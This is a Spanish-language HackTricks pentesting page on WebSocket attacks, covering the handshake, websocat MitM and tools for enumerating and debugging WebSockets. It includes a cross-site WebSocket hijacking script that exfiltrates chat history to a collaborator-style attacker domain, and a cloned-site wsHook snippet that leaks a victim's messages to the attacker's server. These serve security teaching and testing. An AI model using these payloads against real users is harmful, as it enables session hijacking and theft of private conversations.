# Ataques a WebSockets

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## ¬øQu√© son los WebSockets?

Las conexiones WebSocket se inician a trav√©s de **HTTP** y suelen ser **de larga duraci√≥n**. Los mensajes se pueden enviar en **ambas direcciones en cualquier momento** y no tienen una naturaleza transaccional. La conexi√≥n normalmente permanecer√° abierta e inactiva hasta que el cliente o el servidor est√©n listos para enviar un mensaje.\
Los WebSockets son particularmente √∫tiles en situaciones donde se requieren **mensajes de baja latencia o iniciados por el servidor**, como feeds en tiempo real de datos financieros.

## ¬øC√≥mo se establecen las conexiones WebSocket?

(Aqu√≠ encontrar√°s un resumen, pero una **gu√≠a m√°s detallada sobre c√≥mo se crea una conexi√≥n de WebSocket** se puede encontrar [**aqu√≠**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc)).\
Las conexiones WebSocket se crean normalmente utilizando JavaScript en el lado del cliente, como el siguiente:
```javascript
var ws = new WebSocket("wss://normal-website.com/chat");
```
El protocolo **`wss`** establece una conexi√≥n WebSocket sobre una conexi√≥n **TLS** encriptada, mientras que el protocolo **`ws`** utiliza una conexi√≥n **no encriptada**.

Para establecer la conexi√≥n, el navegador y el servidor realizan un handshake WebSocket a trav√©s de HTTP. El navegador emite una solicitud de handshake WebSocket como la siguiente:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Si el servidor acepta la conexi√≥n, devuelve una respuesta de apret√≥n de manos de WebSocket como la siguiente:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
En este punto, la conexi√≥n de red permanece abierta y se puede utilizar para enviar mensajes de WebSocket en ambas direcciones.

**Nota**

Varios **aspectos** de los mensajes de **apret√≥n de manos** de WebSocket son dignos de menci√≥n:

* Los encabezados **`Connection`** y **`Upgrade`** en la solicitud y respuesta **indican** que se trata de un **apret√≥n de manos de WebSocket**.
* El encabezado de solicitud **`Sec-WebSocket-Version`** especifica la **versi√≥n del protocolo WebSocket** que el cliente desea utilizar. Esto suele ser `13`.
* El encabezado de solicitud **`Sec-WebSocket-Key`** contiene un **valor aleatorio** codificado en Base64, que debe generarse aleatoriamente en cada solicitud de apret√≥n de manos.
* El encabezado de respuesta **`Sec-WebSocket-Accept`** contiene un hash del valor enviado en el encabezado de solicitud `Sec-WebSocket-Key`, concatenado con una cadena espec√≠fica definida en la especificaci√≥n del protocolo. Esto se hace para evitar respuestas enga√±osas resultantes de servidores mal configurados o proxies de cach√©.

El encabezado **`Sec-WebSocket-Key`** contiene un **valor aleatorio** para evitar errores de proxies de cach√© y **no se utiliza con fines de autenticaci√≥n o manejo de sesiones** (_No es un token CSRF_).

### Consola de Linux

Puede utilizar `websocat` para establecer una conexi√≥n en bruto con un websocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
O para crear un servidor websocat:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
## Conexiones websocket MitM

Si descubres que los clientes est√°n conectados a un **websocket HTTP** desde tu red local actual, puedes intentar un [Ataque de ARP Spoofing](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) para realizar un ataque MitM entre el cliente y el servidor.\
Una vez que el cliente est√© intentando conectarse, puedes utilizar:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
## Enumeraci√≥n de Websockets

Puedes utilizar la **herramienta** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **para descubrir, identificar y buscar** **vulnerabilidades** conocidas en websockets de forma autom√°tica.

## Herramientas de depuraci√≥n de Websockets

* **Burp Suite** admite la comunicaci√≥n de websockets en modo MitM de manera muy similar a como lo hace para la comunicaci√≥n HTTP regular.
* [**WSSiP**](https://github.com/nccgroup/wssip)**:** Abreviatura de "**WebSocket/Socket.io Proxy**", esta herramienta, escrita en Node.js, proporciona una interfaz de usuario para **capturar, interceptar, enviar mensajes personalizados** y ver todas las comunicaciones de WebSocket y Socket.IO entre el cliente y el servidor.
* [**wsrepl**](https://github.com/doyensec/wsrepl) es un **REPL interactivo de websockets** dise√±ado espec√≠ficamente para pruebas de penetraci√≥n. Proporciona una interfaz para observar **mensajes entrantes de websockets y enviar nuevos**, con un marco f√°cil de usar para **automatizar** esta comunicaci√≥n.&#x20;
* [**https://websocketking.com/**](https://websocketking.com/) es una **web para comunicarse** con otras webs utilizando **websockets**.
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) entre otros tipos de comunicaciones/protocolos, proporciona una **web para comunicarse** con otras webs utilizando **websockets**.

## Laboratorio de Websockets

En [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) tienes un c√≥digo para lanzar una web utilizando websockets y en [**este post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) puedes encontrar una explicaci√≥n.

## Secuestro de WebSocket entre sitios (CSWSH)

Tambi√©n conocido como _secuestro de WebSocket entre or√≠genes_.\
**Es un** [**Cross-Site Request Forgery (CSRF)**](csrf-cross-site-request-forgery.md) **en un handshake de WebSocket**.

Surge cuando la solicitud de **handshake de WebSocket** se basa √∫nicamente en **cookies HTTP** para el manejo de sesiones y no contiene ning√∫n token CSRF u otros valores impredecibles.\
Un atacante puede crear una **p√°gina web maliciosa** en su propio dominio que **establece una conexi√≥n de WebSocket entre sitios** con la aplicaci√≥n vulnerable. La aplicaci√≥n manejar√° la conexi√≥n en el **contexto de la sesi√≥n del usuario v√≠ctima** con la aplicaci√≥n.

### Ataque simple

Ten en cuenta que al **establecer** una conexi√≥n de **websocket**, la **cookie** se **env√≠a** al servidor. El **servidor** puede estar utiliz√°ndola para **relacionar** a cada **usuario espec√≠fico** con su **sesi√≥n de websocket basada en la cookie enviada**.

Entonces, si por **ejemplo** el **servidor de websocket** **env√≠a de vuelta el historial de la conversaci√≥n** de un usuario si se env√≠a un mensaje con "**READY"**, entonces un **simple XSS** al establecer la conexi√≥n (la **cookie** se enviar√° **autom√°ticamente** para autorizar al usuario v√≠ctima) **enviando** "**READY**" ser√° capaz de **recuperar** el historial de la **conversaci√≥n**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie con un subdominio diferente

En esta publicaci√≥n de blog [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/), el atacante logr√≥ **ejecutar c√≥digo Javascript arbitrario en un subdominio** del dominio donde se estaba produciendo la comunicaci√≥n del websocket. Debido a que era un **subdominio**, la **cookie** se estaba **enviando**, y debido a que el **Websocket no verificaba correctamente el origen**, era posible comunicarse con √©l y **robar tokens de √©l**.

### Robando datos del usuario

Copia la aplicaci√≥n web que deseas suplantar (los archivos .html, por ejemplo) y dentro del script donde se produce la comunicaci√≥n del websocket, agrega este c√≥digo:
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
Ahora descarga el archivo `wsHook.js` desde [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) y **gu√°rdalo dentro de la carpeta con los archivos web**.\
Exponiendo la aplicaci√≥n web y haciendo que un usuario se conecte a ella, podr√°s robar los mensajes enviados y recibidos a trav√©s del websocket:
```javascript
sudo python3 -m http.server 80
```
## Condiciones de carrera

Las Condiciones de Carrera en WebSockets tambi√©n son un problema, [consulta esta informaci√≥n para aprender m√°s](race-condition.md#rc-in-websockets).

## Otras vulnerabilidades

Como los WebSockets son un mecanismo para **enviar datos al lado del servidor y al lado del cliente**, dependiendo de c√≥mo el servidor y el cliente manejen la informaci√≥n, **los WebSockets pueden ser utilizados para explotar varias vulnerabilidades como XSS, SQLi o cualquier otra vulnerabilidad web com√∫n utilizando la entrada de un usuario desde un websocket**.

## **WebSocket Smuggling**

Esta vulnerabilidad podr√≠a permitirte **burlar las restricciones de los proxies inversos** haci√©ndoles creer que se estableci√≥ una **comunicaci√≥n websocket** (aunque no sea cierto). Esto podr√≠a permitir a un atacante **acceder a puntos finales ocultos**. Para obtener m√°s informaci√≥n, consulta la siguiente p√°gina:

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## Referencias

{% embed url="https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres que tu **empresa sea anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
